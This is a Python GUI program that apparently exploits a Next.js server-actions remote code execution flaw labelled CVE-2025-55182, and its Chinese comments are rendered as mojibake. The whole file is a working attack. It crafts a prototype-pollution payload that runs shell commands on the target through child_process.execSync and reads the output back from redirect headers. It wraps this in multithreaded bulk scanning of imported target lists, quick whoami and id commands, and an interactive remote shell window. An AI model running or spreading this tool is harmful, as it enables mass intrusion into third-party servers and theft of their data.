#!/usr/bin/env python3
"""
CVE-2025-55182 Next.js RCE Scanner v2.0 - GUI Version
åŠŸèƒ½å¼ºå¤§çš„æ¼æ´æ‰«æå·¥å…·ï¼Œæ”¯æŒæ‰¹é‡æ‰«æã€å¤šçº¿ç¨‹ã€å‘½ä»¤æ‰§è¡Œ

Author: Based on BurpSuite Extension by Cr4at0r
âš ï¸ è­¦å‘Šï¼šä»…ç”¨äºå®‰å…¨ç ”ç©¶ï¼Œè¯·å‹¿ç”¨äºéæ³•ç”¨é€”ï¼
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading
import queue
import urllib.request
import urllib.error
import urllib.parse
import base64
import random
import string
import re
import ssl
import time
import json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# å¿½ç•¥ SSL è¯ä¹¦éªŒè¯
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

# é»˜è®¤æµ‹è¯•è·¯å¾„
DEFAULT_PATHS = [
    "/apps", "/", "/en", "/api/action", "/login", "/dashboard",
    "/admin", "/api", "/app", "/home", "/index", "/main",
    "/api/auth", "/api/user", "/api/data", "/graphql"
]


class CVEScanner:
    """CVE-2025-55182 æ¼æ´æ‰«ææ ¸å¿ƒç±»"""
    
    def __init__(self):
        self.timeout = 15
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    
    @staticmethod
    def random_string(length=8):
        return ''.join(random.choices(string.ascii_lowercase, k=length))
    
    def build_payload(self, command):
        """æ„å»ºæ¼æ´åˆ©ç”¨ payload"""
        if command == "OS_DETECT":
            js_code = "process.platform"
        else:
            escaped_cmd = command.replace("\\", "\\\\").replace("'", "\\'")
            js_code = f"process.mainModule.require('child_process').execSync('{escaped_cmd}')"
        
        prefix = (
            "var res='';"
            "try{"
            f"var out={js_code};"
            "res=Buffer.from(out.toString()).toString('base64');"
            "}catch(e){"
            "res=Buffer.from('Error:'+(e.message||e)).toString('base64');"
            "}"
            "throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});"
        )
        
        escaped_prefix = prefix.replace("\\", "\\\\").replace('"', '\\"')
        
        payload_json = (
            '{"then":"$1:__proto__:then",'
            '"status":"resolved_model",'
            '"reason":-1,'
            '"value":"{\\"then\\":\\"$B1337\\"}",'
            '"_response":{'
            f'"_prefix":"{escaped_prefix}",'
            '"_chunks":"$Q2",'
            '"_formData":{"get":"$1:constructor:constructor"}'
            '}}'
        )
        
        return payload_json
    
    def build_request_body(self, payload_json):
        """æ„å»ºè¯·æ±‚ä½“"""
        boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
        
        body = f"------{boundary}\r\n"
        body += 'Content-Disposition: form-data; name="0"\r\n\r\n'
        body += payload_json + "\r\n"
        body += f"------{boundary}\r\n"
        body += 'Content-Disposition: form-data; name="1"\r\n\r\n'
        body += '"$@0"\r\n'
        body += f"------{boundary}\r\n"
        body += 'Content-Disposition: form-data; name="2"\r\n\r\n'
        body += '[]\r\n'
        body += f"------{boundary}--"
        
        return body, f"----{boundary}"
    
    def decode_result(self, encoded):
        """è§£ç  Base64 ç»“æœ"""
        try:
            encoded = encoded.split('&')[0].split(';')[0]
            encoded = urllib.parse.unquote(encoded)
            padding = 4 - len(encoded) % 4
            if padding != 4:
                encoded += '=' * padding
            return base64.b64decode(encoded).decode('utf-8')
        except:
            return None
    
    def extract_result(self, response_text, headers_dict):
        """æå–æ‰§è¡Œç»“æœ"""
        redirect_url = headers_dict.get('x-action-redirect', '') or headers_dict.get('location', '')
        
        if redirect_url and '?a=' in redirect_url:
            result = self.decode_result(redirect_url.split('?a=')[1])
            if result:
                return result
        
        pattern = r'/login\?a=([A-Za-z0-9+/=%]+)'
        matches = re.findall(pattern, response_text)
        for match in matches:
            result = self.decode_result(match)
            if result and not result.startswith('Error:') and result != '[object Object]':
                return result
        
        return None
    
    def is_nextjs_site(self, url):
        """æ£€æµ‹æ˜¯å¦ä¸º Next.js ç«™ç‚¹"""
        try:
            req = urllib.request.Request(url, headers={'User-Agent': self.user_agent})
            response = urllib.request.urlopen(req, timeout=self.timeout, context=ssl_context)
            content = response.read().decode('utf-8', errors='ignore')
            headers = {k.lower(): v for k, v in response.headers.items()}
            
            indicators = ['_next/static', '__NEXT_DATA__', '/_next/', 'next/dist', '__next', 'Next.js']
            for indicator in indicators:
                if indicator in content:
                    return True
            
            for key, value in headers.items():
                if 'x-nextjs' in key or 'x-powered-by' in key and 'next' in value.lower():
                    return True
            
            return False
        except:
            return False
    
    def execute_exploit(self, url, path, command):
        """æ‰§è¡Œæ¼æ´åˆ©ç”¨"""
        try:
            full_url = f"{url.rstrip('/')}{path}"
            
            payload_json = self.build_payload(command)
            body, boundary = self.build_request_body(payload_json)
            
            headers = {
                'Content-Type': f'multipart/form-data; boundary={boundary}',
                'User-Agent': self.user_agent,
                'Next-Action': 'x',
                'Connection': 'close',
            }
            
            req = urllib.request.Request(full_url, data=body.encode('utf-8'), headers=headers, method='POST')
            
            try:
                response = urllib.request.urlopen(req, timeout=self.timeout, context=ssl_context)
                status_code = response.status
                response_text = response.read().decode('utf-8', errors='ignore')
                headers_dict = {k.lower(): v for k, v in response.headers.items()}
            except urllib.error.HTTPError as e:
                status_code = e.code
                response_text = e.read().decode('utf-8', errors='ignore')
                headers_dict = {k.lower(): v for k, v in e.headers.items()}
            except:
                return None
            
            if status_code in [302, 303, 307]:
                return self.extract_result(response_text, headers_dict)
            
            return self.extract_result(response_text, headers_dict)
            
        except:
            return None
    
    def check_vulnerability(self, url, paths=None, callback=None):
        """æ£€æŸ¥æ¼æ´"""
        if paths is None:
            paths = DEFAULT_PATHS
        
        test_string = self.random_string(8)
        test_command = f"echo {test_string}"
        
        for path in paths:
            if callback:
                callback(f"æµ‹è¯•: {url}{path}")
            
            result = self.execute_exploit(url, path, test_command)
            
            if result and test_string in result.strip():
                return {
                    'vulnerable': True,
                    'path': path,
                    'url': url
                }
        
        return {'vulnerable': False, 'url': url}


class ScannerGUI:
    """GUI ç•Œé¢ç±»"""
    
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("CVE-2025-55182 Next.js RCE Scanner v2.0")
        self.root.geometry("1200x800")
        self.root.minsize(1000, 700)
        
        self.scanner = CVEScanner()
        self.scan_queue = queue.Queue()
        self.results = []
        self.scanning = False
        self.current_target = None
        self.current_path = None
        
        self.setup_ui()
        self.setup_styles()
        
    def setup_styles(self):
        """è®¾ç½®æ ·å¼"""
        style = ttk.Style()
        style.theme_use('clam')
        
        # è‡ªå®šä¹‰é¢œè‰²
        style.configure('Vulnerable.TLabel', foreground='red', font=('Arial', 10, 'bold'))
        style.configure('Safe.TLabel', foreground='green')
        style.configure('Title.TLabel', font=('Arial', 14, 'bold'))
        
    def setup_ui(self):
        """è®¾ç½® UI"""
        # ä¸»æ¡†æ¶
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # ===== é¡¶éƒ¨æ§åˆ¶åŒº =====
        control_frame = ttk.LabelFrame(main_frame, text="æ‰«ææ§åˆ¶", padding="10")
        control_frame.pack(fill=tk.X, pady=(0, 10))
        
        # ç›®æ ‡è¾“å…¥
        target_frame = ttk.Frame(control_frame)
        target_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(target_frame, text="ç›®æ ‡URL:").pack(side=tk.LEFT)
        self.target_entry = ttk.Entry(target_frame, width=50)
        self.target_entry.pack(side=tk.LEFT, padx=5)
        self.target_entry.insert(0, "http://192.168.0.104:3000")
        
        ttk.Button(target_frame, text="æ·»åŠ ç›®æ ‡", command=self.add_target).pack(side=tk.LEFT, padx=2)
        ttk.Button(target_frame, text="ä»æ–‡ä»¶å¯¼å…¥", command=self.import_targets).pack(side=tk.LEFT, padx=2)
        ttk.Button(target_frame, text="æ¸…ç©ºç›®æ ‡", command=self.clear_targets).pack(side=tk.LEFT, padx=2)
        
        # ç›®æ ‡åˆ—è¡¨
        targets_frame = ttk.Frame(control_frame)
        targets_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(targets_frame, text="ç›®æ ‡åˆ—è¡¨:").pack(side=tk.LEFT)
        self.targets_listbox = tk.Listbox(targets_frame, height=3, width=80)
        self.targets_listbox.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        scrollbar = ttk.Scrollbar(targets_frame, orient=tk.VERTICAL, command=self.targets_listbox.yview)
        scrollbar.pack(side=tk.LEFT, fill=tk.Y)
        self.targets_listbox.config(yscrollcommand=scrollbar.set)
        
        # æ‰«æé€‰é¡¹
        options_frame = ttk.Frame(control_frame)
        options_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(options_frame, text="çº¿ç¨‹æ•°:").pack(side=tk.LEFT)
        self.threads_var = tk.StringVar(value="5")
        ttk.Spinbox(options_frame, from_=1, to=20, width=5, textvariable=self.threads_var).pack(side=tk.LEFT, padx=5)
        
        ttk.Label(options_frame, text="è¶…æ—¶(ç§’):").pack(side=tk.LEFT, padx=(20, 0))
        self.timeout_var = tk.StringVar(value="15")
        ttk.Spinbox(options_frame, from_=5, to=60, width=5, textvariable=self.timeout_var).pack(side=tk.LEFT, padx=5)
        
        self.detect_nextjs_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(options_frame, text="åªæ‰«æ Next.js ç«™ç‚¹", variable=self.detect_nextjs_var).pack(side=tk.LEFT, padx=20)
        
        # æ‰«ææŒ‰é’®
        btn_frame = ttk.Frame(control_frame)
        btn_frame.pack(fill=tk.X, pady=5)
        
        self.scan_btn = ttk.Button(btn_frame, text="ğŸ” å¼€å§‹æ‰«æ", command=self.start_scan, width=15)
        self.scan_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_btn = ttk.Button(btn_frame, text="â¹ åœæ­¢æ‰«æ", command=self.stop_scan, width=15, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=5)
        
        ttk.Button(btn_frame, text="ğŸ“‹ å¯¼å‡ºç»“æœ", command=self.export_results, width=15).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="ğŸ—‘ æ¸…ç©ºç»“æœ", command=self.clear_results, width=15).pack(side=tk.LEFT, padx=5)
        
        # çŠ¶æ€æ 
        self.status_var = tk.StringVar(value="å°±ç»ª")
        self.status_label = ttk.Label(btn_frame, textvariable=self.status_var)
        self.status_label.pack(side=tk.RIGHT, padx=10)
        
        # ===== ä¸­éƒ¨ç»“æœåŒº =====
        results_frame = ttk.LabelFrame(main_frame, text="æ‰«æç»“æœ", padding="10")
        results_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        # ç»“æœè¡¨æ ¼
        columns = ('#', 'ç›®æ ‡URL', 'çŠ¶æ€', 'æ¼æ´è·¯å¾„', 'ç”¨æˆ·', 'ç³»ç»Ÿ', 'å‘ç°æ—¶é—´')
        self.results_tree = ttk.Treeview(results_frame, columns=columns, show='headings', height=10)
        
        self.results_tree.heading('#', text='#')
        self.results_tree.heading('ç›®æ ‡URL', text='ç›®æ ‡URL')
        self.results_tree.heading('çŠ¶æ€', text='çŠ¶æ€')
        self.results_tree.heading('æ¼æ´è·¯å¾„', text='æ¼æ´è·¯å¾„')
        self.results_tree.heading('ç”¨æˆ·', text='ç”¨æˆ·')
        self.results_tree.heading('ç³»ç»Ÿ', text='ç³»ç»Ÿ')
        self.results_tree.heading('å‘ç°æ—¶é—´', text='å‘ç°æ—¶é—´')
        
        self.results_tree.column('#', width=40)
        self.results_tree.column('ç›®æ ‡URL', width=250)
        self.results_tree.column('çŠ¶æ€', width=80)
        self.results_tree.column('æ¼æ´è·¯å¾„', width=100)
        self.results_tree.column('ç”¨æˆ·', width=100)
        self.results_tree.column('ç³»ç»Ÿ', width=80)
        self.results_tree.column('å‘ç°æ—¶é—´', width=150)
        
        self.results_tree.pack(fill=tk.BOTH, expand=True, side=tk.LEFT)
        
        tree_scroll = ttk.Scrollbar(results_frame, orient=tk.VERTICAL, command=self.results_tree.yview)
        tree_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        self.results_tree.config(yscrollcommand=tree_scroll.set)
        
        # å³é”®èœå•
        self.tree_menu = tk.Menu(self.root, tearoff=0)
        self.tree_menu.add_command(label="å¤åˆ¶ URL", command=self.copy_url)
        self.tree_menu.add_command(label="æ‰§è¡Œå‘½ä»¤...", command=self.execute_command_dialog)
        self.tree_menu.add_command(label="æ‰“å¼€è®¡ç®—å™¨", command=self.open_calculator)
        self.tree_menu.add_separator()
        self.tree_menu.add_command(label="äº¤äº’å¼ Shell", command=self.open_shell)
        
        self.results_tree.bind("<Button-2>", self.show_context_menu)  # macOS
        self.results_tree.bind("<Button-3>", self.show_context_menu)  # Windows/Linux
        
        # ===== åº•éƒ¨æ—¥å¿—åŒº =====
        log_frame = ttk.LabelFrame(main_frame, text="æ‰«ææ—¥å¿—", padding="10")
        log_frame.pack(fill=tk.BOTH, expand=True)
        
        self.log_text = scrolledtext.ScrolledText(log_frame, height=12, bg='#1e1e1e', fg='#00ff00', 
                                                   font=('Consolas', 10), insertbackground='white')
        self.log_text.pack(fill=tk.BOTH, expand=True)
        
        # å‘½ä»¤æ‰§è¡Œæ¡†
        cmd_frame = ttk.Frame(log_frame)
        cmd_frame.pack(fill=tk.X, pady=(5, 0))
        
        ttk.Label(cmd_frame, text="å‘½ä»¤æ‰§è¡Œ:").pack(side=tk.LEFT)
        self.cmd_entry = ttk.Entry(cmd_frame, width=60)
        self.cmd_entry.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        self.cmd_entry.bind('<Return>', lambda e: self.execute_command())
        
        ttk.Button(cmd_frame, text="æ‰§è¡Œ", command=self.execute_command, width=10).pack(side=tk.LEFT, padx=2)
        ttk.Button(cmd_frame, text="whoami", command=lambda: self.quick_cmd("whoami"), width=8).pack(side=tk.LEFT, padx=2)
        ttk.Button(cmd_frame, text="id", command=lambda: self.quick_cmd("id"), width=5).pack(side=tk.LEFT, padx=2)
        ttk.Button(cmd_frame, text="pwd", command=lambda: self.quick_cmd("pwd"), width=5).pack(side=tk.LEFT, padx=2)
        ttk.Button(cmd_frame, text="è®¡ç®—å™¨", command=self.open_calculator, width=8).pack(side=tk.LEFT, padx=2)
        
    def log(self, message, level="INFO"):
        """å†™å…¥æ—¥å¿—"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        color_map = {
            "INFO": "#00ff00",
            "SUCCESS": "#00ffff", 
            "ERROR": "#ff6b6b",
            "WARNING": "#ffff00"
        }
        
        self.log_text.config(state=tk.NORMAL)
        
        # æ ¹æ®çº§åˆ«è®¾ç½®é¢œè‰²
        if level == "SUCCESS":
            prefix = "[+]"
        elif level == "ERROR":
            prefix = "[-]"
        elif level == "WARNING":
            prefix = "[!]"
        else:
            prefix = "[*]"
        
        self.log_text.insert(tk.END, f"[{timestamp}] {prefix} {message}\n")
        self.log_text.see(tk.END)
        self.log_text.config(state=tk.DISABLED)
        
    def add_target(self):
        """æ·»åŠ ç›®æ ‡"""
        url = self.target_entry.get().strip()
        if url:
            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
            if url not in self.targets_listbox.get(0, tk.END):
                self.targets_listbox.insert(tk.END, url)
                self.target_entry.delete(0, tk.END)
                self.log(f"æ·»åŠ ç›®æ ‡: {url}")
            else:
                messagebox.showwarning("è­¦å‘Š", "ç›®æ ‡å·²å­˜åœ¨!")
    
    def import_targets(self):
        """ä»æ–‡ä»¶å¯¼å…¥ç›®æ ‡"""
        filename = filedialog.askopenfilename(
            title="é€‰æ‹©ç›®æ ‡æ–‡ä»¶",
            filetypes=[("æ–‡æœ¬æ–‡ä»¶", "*.txt"), ("æ‰€æœ‰æ–‡ä»¶", "*.*")]
        )
        if filename:
            try:
                with open(filename, 'r') as f:
                    count = 0
                    for line in f:
                        url = line.strip()
                        if url and not url.startswith('#'):
                            if not url.startswith(('http://', 'https://')):
                                url = 'http://' + url
                            if url not in self.targets_listbox.get(0, tk.END):
                                self.targets_listbox.insert(tk.END, url)
                                count += 1
                    self.log(f"ä»æ–‡ä»¶å¯¼å…¥ {count} ä¸ªç›®æ ‡")
            except Exception as e:
                messagebox.showerror("é”™è¯¯", f"å¯¼å…¥å¤±è´¥: {str(e)}")
    
    def clear_targets(self):
        """æ¸…ç©ºç›®æ ‡"""
        self.targets_listbox.delete(0, tk.END)
        self.log("å·²æ¸…ç©ºç›®æ ‡åˆ—è¡¨")
    
    def clear_results(self):
        """æ¸…ç©ºç»“æœ"""
        for item in self.results_tree.get_children():
            self.results_tree.delete(item)
        self.results = []
        self.log("å·²æ¸…ç©ºæ‰«æç»“æœ")
    
    def start_scan(self):
        """å¼€å§‹æ‰«æ"""
        targets = list(self.targets_listbox.get(0, tk.END))
        if not targets:
            # å¦‚æœæ²¡æœ‰æ·»åŠ ç›®æ ‡ï¼Œä½¿ç”¨è¾“å…¥æ¡†ä¸­çš„
            url = self.target_entry.get().strip()
            if url:
                if not url.startswith(('http://', 'https://')):
                    url = 'http://' + url
                targets = [url]
            else:
                messagebox.showwarning("è­¦å‘Š", "è¯·æ·»åŠ æ‰«æç›®æ ‡!")
                return
        
        self.scanning = True
        self.scan_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        
        self.scanner.timeout = int(self.timeout_var.get())
        
        # å¯åŠ¨æ‰«æçº¿ç¨‹
        scan_thread = threading.Thread(target=self.scan_worker, args=(targets,), daemon=True)
        scan_thread.start()
    
    def stop_scan(self):
        """åœæ­¢æ‰«æ"""
        self.scanning = False
        self.status_var.set("æ­£åœ¨åœæ­¢...")
        self.log("æ­£åœ¨åœæ­¢æ‰«æ...", "WARNING")
    
    def scan_worker(self, targets):
        """æ‰«æå·¥ä½œçº¿ç¨‹"""
        threads = int(self.threads_var.get())
        detect_nextjs = self.detect_nextjs_var.get()
        
        self.log(f"å¼€å§‹æ‰«æ {len(targets)} ä¸ªç›®æ ‡, çº¿ç¨‹æ•°: {threads}")
        
        def scan_target(url):
            if not self.scanning:
                return None
            
            # æ£€æµ‹æ˜¯å¦ä¸º Next.js
            if detect_nextjs:
                self.root.after(0, lambda: self.status_var.set(f"æ£€æµ‹: {url}"))
                self.root.after(0, lambda: self.log(f"æ£€æµ‹ Next.js: {url}"))
                
                if not self.scanner.is_nextjs_site(url):
                    self.root.after(0, lambda: self.log(f"é Next.js ç«™ç‚¹: {url}", "WARNING"))
                    return {'url': url, 'vulnerable': False, 'reason': 'é Next.js'}
            
            # æ‰«ææ¼æ´
            self.root.after(0, lambda: self.status_var.set(f"æ‰«æ: {url}"))
            
            result = self.scanner.check_vulnerability(
                url, 
                paths=DEFAULT_PATHS,
                callback=lambda msg: self.root.after(0, lambda: self.log(msg))
            )
            
            if result['vulnerable']:
                # è·å–æ›´å¤šä¿¡æ¯
                user_info = self.scanner.execute_exploit(url, result['path'], "whoami") or "N/A"
                os_info = self.scanner.execute_exploit(url, result['path'], "OS_DETECT") or "N/A"
                
                os_map = {"darwin": "macOS", "linux": "Linux", "win32": "Windows"}
                os_info = os_map.get(os_info.strip(), os_info.strip()) if os_info != "N/A" else "N/A"
                
                result['user'] = user_info.strip() if user_info != "N/A" else "N/A"
                result['os'] = os_info
                
                self.root.after(0, lambda: self.log(f"å‘ç°æ¼æ´! {url} (è·¯å¾„: {result['path']})", "SUCCESS"))
            else:
                self.root.after(0, lambda: self.log(f"æœªå‘ç°æ¼æ´: {url}"))
            
            return result
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(scan_target, url): url for url in targets}
            
            for future in as_completed(futures):
                if not self.scanning:
                    break
                    
                result = future.result()
                if result:
                    self.root.after(0, lambda r=result: self.add_result(r))
        
        self.root.after(0, self.scan_complete)
    
    def add_result(self, result):
        """æ·»åŠ æ‰«æç»“æœ"""
        row_num = len(self.results) + 1
        status = "ğŸ”´ å­˜åœ¨æ¼æ´" if result.get('vulnerable') else "ğŸŸ¢ å®‰å…¨"
        
        self.results.append(result)
        
        values = (
            row_num,
            result['url'],
            status,
            result.get('path', 'N/A'),
            result.get('user', 'N/A'),
            result.get('os', 'N/A'),
            datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        )
        
        item = self.results_tree.insert('', tk.END, values=values)
        
        # é«˜äº®æ¼æ´è¡Œ
        if result.get('vulnerable'):
            self.results_tree.tag_configure('vulnerable', background='#ffcccc')
            self.results_tree.item(item, tags=('vulnerable',))
    
    def scan_complete(self):
        """æ‰«æå®Œæˆ"""
        self.scanning = False
        self.scan_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.status_var.set("æ‰«æå®Œæˆ")
        
        vuln_count = sum(1 for r in self.results if r.get('vulnerable'))
        self.log(f"æ‰«æå®Œæˆ! å‘ç° {vuln_count} ä¸ªæ¼æ´ç«™ç‚¹", "SUCCESS" if vuln_count > 0 else "INFO")
    
    def show_context_menu(self, event):
        """æ˜¾ç¤ºå³é”®èœå•"""
        item = self.results_tree.identify_row(event.y)
        if item:
            self.results_tree.selection_set(item)
            self.tree_menu.post(event.x_root, event.y_root)
    
    def get_selected_target(self):
        """è·å–é€‰ä¸­çš„ç›®æ ‡"""
        selection = self.results_tree.selection()
        if not selection:
            messagebox.showwarning("è­¦å‘Š", "è¯·å…ˆé€‰æ‹©ä¸€ä¸ªæ¼æ´ç›®æ ‡!")
            return None, None
        
        item = selection[0]
        values = self.results_tree.item(item, 'values')
        
        # æ‰¾åˆ°å¯¹åº”çš„ç»“æœ
        idx = int(values[0]) - 1
        if idx < len(self.results) and self.results[idx].get('vulnerable'):
            return self.results[idx]['url'], self.results[idx]['path']
        
        messagebox.showwarning("è­¦å‘Š", "è¯¥ç›®æ ‡ä¸å­˜åœ¨æ¼æ´æˆ–è·¯å¾„ä¿¡æ¯!")
        return None, None
    
    def copy_url(self):
        """å¤åˆ¶ URL"""
        selection = self.results_tree.selection()
        if selection:
            values = self.results_tree.item(selection[0], 'values')
            self.root.clipboard_clear()
            self.root.clipboard_append(values[1])
            self.log(f"å·²å¤åˆ¶: {values[1]}")
    
    def execute_command_dialog(self):
        """æ‰§è¡Œå‘½ä»¤å¯¹è¯æ¡†"""
        url, path = self.get_selected_target()
        if not url:
            return
        
        cmd = tk.simpledialog.askstring("æ‰§è¡Œå‘½ä»¤", "è¾“å…¥è¦æ‰§è¡Œçš„å‘½ä»¤:", initialvalue="id")
        if cmd:
            self.current_target = url
            self.current_path = path
            self.execute_command_on_target(cmd)
    
    def execute_command(self):
        """æ‰§è¡Œå‘½ä»¤"""
        cmd = self.cmd_entry.get().strip()
        if not cmd:
            return
        
        # ä¼˜å…ˆä½¿ç”¨é€‰ä¸­çš„ç›®æ ‡
        url, path = self.get_selected_target()
        if url:
            self.current_target = url
            self.current_path = path
        
        if not self.current_target or not self.current_path:
            messagebox.showwarning("è­¦å‘Š", "è¯·å…ˆé€‰æ‹©ä¸€ä¸ªæ¼æ´ç›®æ ‡!")
            return
        
        self.execute_command_on_target(cmd)
        self.cmd_entry.delete(0, tk.END)
    
    def quick_cmd(self, cmd):
        """å¿«æ·å‘½ä»¤"""
        url, path = self.get_selected_target()
        if url:
            self.current_target = url
            self.current_path = path
        
        if not self.current_target or not self.current_path:
            messagebox.showwarning("è­¦å‘Š", "è¯·å…ˆé€‰æ‹©ä¸€ä¸ªæ¼æ´ç›®æ ‡!")
            return
        
        self.execute_command_on_target(cmd)
    
    def execute_command_on_target(self, cmd):
        """åœ¨ç›®æ ‡ä¸Šæ‰§è¡Œå‘½ä»¤"""
        self.log(f"æ‰§è¡Œå‘½ä»¤: {cmd} @ {self.current_target}")
        
        def run():
            result = self.scanner.execute_exploit(self.current_target, self.current_path, cmd)
            if result:
                self.root.after(0, lambda: self.log(f"å‘½ä»¤è¾“å‡º:\n{result.strip()}", "SUCCESS"))
            else:
                self.root.after(0, lambda: self.log("å‘½ä»¤æ‰§è¡Œå¤±è´¥æˆ–æ— è¾“å‡º", "ERROR"))
        
        threading.Thread(target=run, daemon=True).start()
    
    def open_calculator(self):
        """æ‰“å¼€è®¡ç®—å™¨"""
        url, path = self.get_selected_target()
        if not url:
            return
        
        self.log(f"å°è¯•æ‰“å¼€è®¡ç®—å™¨: {url}")
        
        def run():
            os_result = self.scanner.execute_exploit(url, path, "OS_DETECT")
            if os_result:
                os_name = os_result.strip()
                
                if os_name == "darwin":
                    cmd = "open -a Calculator"
                elif os_name == "win32":
                    cmd = "calc.exe"
                elif os_name == "linux":
                    cmd = "gnome-calculator || xcalc || kcalc &"
                else:
                    self.root.after(0, lambda: self.log(f"æœªçŸ¥ç³»ç»Ÿ: {os_name}", "ERROR"))
                    return
                
                self.root.after(0, lambda: self.log(f"æ‰§è¡Œ: {cmd}"))
                self.scanner.execute_exploit(url, path, cmd)
                self.root.after(0, lambda: self.log("è®¡ç®—å™¨å‘½ä»¤å·²å‘é€!", "SUCCESS"))
        
        threading.Thread(target=run, daemon=True).start()
    
    def open_shell(self):
        """æ‰“å¼€äº¤äº’å¼ Shell çª—å£"""
        url, path = self.get_selected_target()
        if not url:
            return
        
        # åˆ›å»ºæ–°çª—å£
        shell_window = tk.Toplevel(self.root)
        shell_window.title(f"Shell - {url}")
        shell_window.geometry("800x500")
        
        # Shell è¾“å‡º
        output = scrolledtext.ScrolledText(shell_window, bg='black', fg='lime', 
                                           font=('Consolas', 11), insertbackground='white')
        output.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # å‘½ä»¤è¾“å…¥
        input_frame = ttk.Frame(shell_window)
        input_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(input_frame, text="$").pack(side=tk.LEFT)
        cmd_input = ttk.Entry(input_frame, font=('Consolas', 11))
        cmd_input.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        cmd_input.focus()
        
        def execute_shell_cmd(event=None):
            cmd = cmd_input.get().strip()
            if not cmd:
                return
            
            output.config(state=tk.NORMAL)
            output.insert(tk.END, f"$ {cmd}\n")
            output.see(tk.END)
            cmd_input.delete(0, tk.END)
            
            def run():
                result = self.scanner.execute_exploit(url, path, cmd)
                shell_window.after(0, lambda: show_result(result))
            
            def show_result(result):
                output.config(state=tk.NORMAL)
                if result:
                    output.insert(tk.END, f"{result}")
                else:
                    output.insert(tk.END, "[!] æ‰§è¡Œå¤±è´¥\n")
                output.insert(tk.END, "\n")
                output.see(tk.END)
                output.config(state=tk.DISABLED)
            
            threading.Thread(target=run, daemon=True).start()
        
        cmd_input.bind('<Return>', execute_shell_cmd)
        
        output.config(state=tk.NORMAL)
        output.insert(tk.END, f"Connected to {url}\n")
        output.insert(tk.END, f"Vulnerable path: {path}\n")
        output.insert(tk.END, "Type commands to execute...\n\n")
        output.config(state=tk.DISABLED)
    
    def export_results(self):
        """å¯¼å‡ºç»“æœ"""
        if not self.results:
            messagebox.showwarning("è­¦å‘Š", "æ²¡æœ‰ç»“æœå¯å¯¼å‡º!")
            return
        
        filename = filedialog.asksaveasfilename(
            title="ä¿å­˜ç»“æœ",
            defaultextension=".json",
            filetypes=[("JSON æ–‡ä»¶", "*.json"), ("CSV æ–‡ä»¶", "*.csv"), ("æ–‡æœ¬æ–‡ä»¶", "*.txt")]
        )
        
        if filename:
            try:
                if filename.endswith('.json'):
                    with open(filename, 'w', encoding='utf-8') as f:
                        json.dump(self.results, f, indent=2, ensure_ascii=False)
                elif filename.endswith('.csv'):
                    with open(filename, 'w', encoding='utf-8') as f:
                        f.write("URL,çŠ¶æ€,æ¼æ´è·¯å¾„,ç”¨æˆ·,ç³»ç»Ÿ\n")
                        for r in self.results:
                            status = "æ¼æ´" if r.get('vulnerable') else "å®‰å…¨"
                            f.write(f"{r['url']},{status},{r.get('path', 'N/A')},{r.get('user', 'N/A')},{r.get('os', 'N/A')}\n")
                else:
                    with open(filename, 'w', encoding='utf-8') as f:
                        f.write("CVE-2025-55182 æ‰«æç»“æœ\n")
                        f.write("=" * 50 + "\n\n")
                        for r in self.results:
                            if r.get('vulnerable'):
                                f.write(f"[æ¼æ´] {r['url']}\n")
                                f.write(f"  è·¯å¾„: {r.get('path', 'N/A')}\n")
                                f.write(f"  ç”¨æˆ·: {r.get('user', 'N/A')}\n")
                                f.write(f"  ç³»ç»Ÿ: {r.get('os', 'N/A')}\n\n")
                
                self.log(f"ç»“æœå·²å¯¼å‡º: {filename}", "SUCCESS")
            except Exception as e:
                messagebox.showerror("é”™è¯¯", f"å¯¼å‡ºå¤±è´¥: {str(e)}")
    
    def run(self):
        """è¿è¡Œç¨‹åº"""
        self.root.mainloop()


# éœ€è¦ simpledialog
import tkinter.simpledialog

if __name__ == "__main__":
    app = ScannerGUI()
    app.run()

